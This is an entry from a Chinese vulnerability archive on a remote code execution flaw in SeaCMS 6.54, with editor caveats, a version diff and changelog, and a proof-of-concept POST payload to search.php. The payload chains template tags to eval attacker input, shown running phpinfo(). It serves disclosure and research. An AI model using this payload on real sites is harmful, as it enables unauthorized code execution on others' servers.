---
source: "白阁文库 BaizeSec/bylibrary"
product: "SeaCMS6.54"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "seacms6.54远程代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：前台搜索多字段模板拼接/旧PHP执行"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0550161af19a0a8ef69549f5"
entity_id: "ve-0550161af19a0a8ef69549f5"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：前台搜索多字段模板拼接/旧PHP执行

- **事实待核（1）**：与387同phpinfo载荷，本文补6.53→6.54 order白名单改动及历史更新日期，值得保留。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：百度网盘包无哈希/固定来源，未下载核验；没有响应/完整原理。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（3）**：旧PHP解析条件缺，不扩大至后续。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# seacms6.54远程代码执行

## Affected Version 6.54

链接:https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA  

密码:qlwh


6.54 和6.53版本的不同之处是在：

`search.php`的65行的`order`参数做了限制。

`$order = ($order == "commend" || $order == "time" || $order == "hit") ? $order : "";`


```
更新日期：2017年8月7日 v6.54
修复：紧急修复2处高危安全漏洞

更新日期：2017年8月6日 v6.53
新增：微信公众平台模块
优化：采集逻辑
修复：部分文字描述错误
更新日期：2017年2月18日 v6.46
修复：两处安全问题

更新日期：2017年2月6日 v6.45
修复：一处安全问题
```

	

## POC


    http://192.168.0.6/seacms654/search.php
    POST：
    searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();


## References

[漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](http://www.freebuf.com/vuls/150042.html)


---

> 来源：白阁文库 BaizeSec/bylibrary
